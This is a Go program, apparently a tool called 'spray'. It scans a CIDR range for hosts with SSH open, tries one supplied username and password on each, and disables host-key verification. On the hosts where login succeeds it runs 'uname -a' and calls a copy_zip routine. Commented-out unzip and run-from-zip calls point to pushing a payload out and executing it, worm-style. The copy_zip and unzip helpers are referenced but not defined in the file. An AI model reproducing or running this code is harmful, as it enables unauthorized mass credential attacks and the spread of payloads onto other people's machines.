package main

import (
	"fmt"
	"log"
	"net"
	"sync"
	"time"
	"os"

	"golang.org/x/crypto/ssh"
)

type ScanResult struct {
	IP   string `json:"ip"`
	Port int    `json:"port"`
}

// args: ./spray CIDR username password filename
func main() {
	cidr := os.Args[1]
	port := 22
	report := scanCIDR(cidr, port)
	var wg sync.WaitGroup

	for i := 0; i < len(report); i++ {
		wg.Add(1)
		go func(ip string, port int) {
			defer wg.Done()

			fmt.Printf("Trying %s:%d\n", ip, port)
			config := &ssh.ClientConfig{
				User: os.Args[2],
				Auth: []ssh.AuthMethod{
					ssh.Password(os.Args[3]),
				},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				Timeout:         5 * time.Second, // Add timeout to prevent hanging
			}

			client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", ip, port), config)
			if err != nil {
				log.Printf("Failed to dial %s: %v\n", ip, err)
				return // Continue to next iteration
			}
			defer client.Close()

			// Create a new SSH session
			session, err := client.NewSession()
			if err != nil {
				log.Printf("Failed to create session for %s: %v\n", ip, err)
				return
			}
			defer session.Close()

			output, err := session.Output("uname -a")
			if err != nil {
				log.Printf("Failed to run command on %s: %v\n", ip, err)
				return
			}

			copy_zip(client)
			//unzip_zip(client)
			//run_from_zip(client)

			fmt.Printf("Success on %s - Command output: %s\n", ip, output)
		}(report[i].IP, report[i].Port)
	}

	wg.Wait()
}

func scanCIDR(cidr string, port int) []ScanResult {
	// Parse the CIDR range
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		fmt.Printf("Error parsing CIDR: %v\n", err)
		return nil
	}

	var openHosts []ScanResult
	var wg sync.WaitGroup
	var mutex sync.Mutex

	// Iterate through all IPs in the CIDR range
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		wg.Add(1)
		go func(ip string) {
			defer wg.Done()

			// Format the address with port
			address := fmt.Sprintf("%s:%d", ip, port)

			// Attempt to connect with timeout
			conn, err := net.DialTimeout("tcp", address, 2*time.Second)
			if err == nil {
				mutex.Lock()
				openHosts = append(openHosts, ScanResult{IP: ip, Port: port})
				mutex.Unlock()
				conn.Close()
			}
		}(ip.String())
	}

	wg.Wait()
	return openHosts
}

// Helper function to increment IP address
func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}
